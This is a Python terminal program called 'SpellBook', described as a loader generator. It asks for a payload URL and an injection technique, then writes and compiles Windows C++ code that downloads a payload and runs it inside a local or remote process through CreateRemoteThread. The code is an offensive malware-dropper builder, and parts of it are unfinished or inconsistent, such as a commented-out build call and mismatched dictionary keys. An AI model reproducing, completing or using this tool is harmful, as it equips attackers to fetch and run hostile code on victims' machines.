from curses import wrapper, curs_set, textpad, window, A_REVERSE, KEY_UP, KEY_DOWN
import os
import time

class Menu:
    def __init__(self, stdscr: window, posx: int, posy: int, items: list|tuple):
        self.stdscr = stdscr
        self.posx = posx
        self.posy = posy
        self.items = items
        self.num_items = len(self.items)
        self.cur_item = 0
    
    def cursor_up(self):
        self.cur_item = (self.cur_item - 1) % self.num_items
    
    def cursor_down(self):
        self.cur_item = (self.cur_item + 1) % self.num_items
    
    def get_cur_item(self):
        return self.items[self.cur_item]
    
    def get_cur_index(self):
        return self.cur_item

    def print(self):
        for i in range(self.num_items):
            if i == self.cur_item:
                self.stdscr.addstr(self.posx + i, self.posy, self.items[i], A_REVERSE)
            else:
                self.stdscr.addstr(self.posx + i, self.posy, self.items[i])

class TextInputView:
    def __init__(self, stdscr: window, title=None, input_len=100):
        self.stdscr = stdscr
        self.title = title
        self.curwindow = stdscr.derwin(1, 1)
        self.text_window_card = self.curwindow.derwin(3, input_len + 2, 1, 1)
        self.text_window = self.text_window_card.derwin(1, input_len, 1, 1)
        self.textbox = textpad.Textbox(self.text_window)
    
    def exec(self):
        text_input = "/"
        self.curwindow.refresh()
        self.text_window_card.border()
        if self.title:
            self.text_window_card.addstr(0, 1, self.title)
        self.text_window_card.refresh()
        while text_input == "/":
            self.text_window.clear()

            curs_set(True)
            text_input = self.textbox.edit()
            curs_set(False)

            self.text_window.refresh()
        
        return text_input
    
class ProcessSelectionView(TextInputView):
    def __init__(self, stdscr):
        super().__init__(stdscr, "Enter target process name", 50)

    def exec(self):
        process_name = super().exec()
        params = {
            "process_name": process_name
        }
        return params

class RemoteInjectionView:
    def __init__(self, stdscr: window):
        self.stdscr = stdscr
        self.curwindow = stdscr.derwin(1, 1)

        self.enum_types = {
            "Enumeration via Snapshot": {
                "callback_function": ProcessSelectionView(stdscr).exec
            }
        }

        self.injection_types = {
            "CreateRemoteThread": {
                "header_file": "RemoteInjection.h"
            }
        }

    def render_selection(self, menu, title):
        curs_set(False)
        menu_choice = "/"
        while menu_choice == "/":
            self.curwindow.clear()
            self.curwindow.addstr(0, 0, title)
            menu.print()

            key = self.curwindow.getch()
            if key == KEY_UP:
                menu.cursor_up()
            elif key == KEY_DOWN:
                menu.cursor_down()
            elif key == 10: # ENTER
                menu_choice = menu.get_cur_item()
            elif key == ord('q'):
                exit(0)
            
            self.curwindow.clear()
            self.curwindow.refresh()
        
        return menu_choice

    def exec(self):
        remote_injection_params = {}
        enum_menu = Menu(self.curwindow, 1, 0, list(self.enum_types.keys()))
        enumeration_type = self.render_selection(enum_menu, "Select Process/Thread Enumeration Techinque")
        remote_injection_params["process_enum_type"] = enumeration_type
        remote_injection_params["technique_header_file"] = self.enum_types[enumeration_type]["header_file"]
        
        if "callback_function" in self.enum_types[enumeration_type]:
            remote_injection_params.update(self.enum_types[enumeration_type]["callback_function"]())
            type_menu = Menu(self.curwindow, 1, 0, list(self.injection_types.keys()))
            remote_injection_params["injection_type"] = self.render_selection(type_menu, "Select Injection Type")
            remote_injection_params["injection_type_header_file"] = self.injection_types[remote_injection_params["injection_type"]]["header_file"]

        return remote_injection_params

class InjectionTechniqueView:
    def __init__(self, stdscr: window):
        self.stdscr = stdscr
        self.curwindow = stdscr.derwin(1, 1)

        self.techniques = {
            "Local Injection": {
                "header_file": "LocalInjection.h"
            },
            "Remote Process Injection": {
                "header_file": "ProcessEnum32Snapshot.h",
                "callback_function": RemoteInjectionView(stdscr).exec
            }
        }
        self.menu = Menu(self.curwindow, 2, 0, list(self.techniques.keys()))

    def render_technique_selection(self):
        curs_set(False)
        menu_choice = "/"
        while menu_choice == "/":
            self.curwindow.clear()
            self.curwindow.addstr(0, 0, "Select Injection Techinque")
            self.menu.print()

            key = self.curwindow.getch()
            if key == KEY_UP:
                self.menu.cursor_up()
            elif key == KEY_DOWN:
                self.menu.cursor_down()
            elif key == 10: # ENTER
                menu_choice = self.menu.get_cur_item()
            elif key == ord('q'):
                exit(0)
            
            self.curwindow.clear()
            self.curwindow.refresh()
        
        return menu_choice

    def exec(self):
        injection_params = {}

        injection_technique = self.render_technique_selection()
        injection_params["injection technique"] = injection_technique
        injection_params["injection_type_header_file"] = self.techniques[injection_technique]["header_file"]

        if "callback_function" in self.techniques[injection_technique]:
            injection_params.update(self.techniques[injection_technique]["callback_function"]())

        
        return injection_params

def wait_for_enter(stdscr: window):
    ch = stdscr.getch()
    while ch not in [10, 113]: # ENTER or q
        ch = stdscr.getch()
    
    if ch == 113:
        exit(0)

def build (Enumeration, ProcessName, Loader, Url, Dict):
    f = open ("main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"
#include "Libraires/{Enumeration}"
#include "Libraries/{Loader}"

using namespace std;

int main()
{{
    PBYTE  pPayloadAddress;
    DWORD pPayloadSize;
    string Url  = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
        cout << "Failed to fetch payload" << endl;
        return 0;
    }}

    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);
"""
)
    
    if Enumeration in Dict:
        f.write(
f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess)){{
        cout << "Failed to find remote process" << endl;
        return 0;
    }}  

""")

    f.write(
f"""\n

    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
        cout << "Failed to execute payload" << endl;
        return 0;
    }}

    return 0;
}}
""")

    f.close()
    time.sleep(2)
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -o chungus main.cpp -lwininet -lws2_32 -mwindows")
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def main(stdscr: window):
    stdscr.border()
    # Begin banner
    stdscr.addstr(1, 2, "  _________             .__  .__ __________               __    ")
    stdscr.addstr(2, 2, " /   _____/_____   ____ |  | |  |\\______   \\ ____   ____ |  | __")
    stdscr.addstr(3, 2, " \\_____  \\\\____ \\_/ __ \\|  | |  | |    |  _//  _ \\ /  _ \\|  |/ /")
    stdscr.addstr(4, 2, " /        \\  |_> >  ___/|  |_|  |_|    |   (  <_> |  <_> )    < ")
    stdscr.addstr(5, 2, "/_______  /   __/ \\___  >____/____/______  /\\____/ \\____/|__|_ \\")
    stdscr.addstr(6, 2, "        \\/|__|        \\/                 \\/                   \\/")
    stdscr.addstr(8, 2, "Welcome to SpellBook. The magically amazing Loader generator.")
    stdscr.addstr(9, 2, "Press Enter to begin or Q to exit...")
    # End banner
    stdscr.refresh()

    wait_for_enter(stdscr)
    stdscr.clear()
    stdscr.border()
    stdscr.refresh()

    payload_url = TextInputView(stdscr, "Enter Payload URL", 100).exec()

    injection_params = InjectionTechniqueView(stdscr).exec()

    window = stdscr.derwin(1, 1)

    key = None
    while key != ord('q'):
        window.clear()
        window.addstr(0, 0, "PAYLOAD URL: " + payload_url)

        i = 1
        for key, value in injection_params.items():
            window.addstr(i, 0, f"{key.upper().replace('_', ' ')}: {value}")
            i += 1

        window.refresh()
        key = window.getch()
    
    print(injection_params)
    #build(injection_params["technique_header_file"], injection_params["process_name"], injection_params["injection_type_header_file"], payload_url, injection_params)

if __name__ == "__main__":
    wrapper(main)
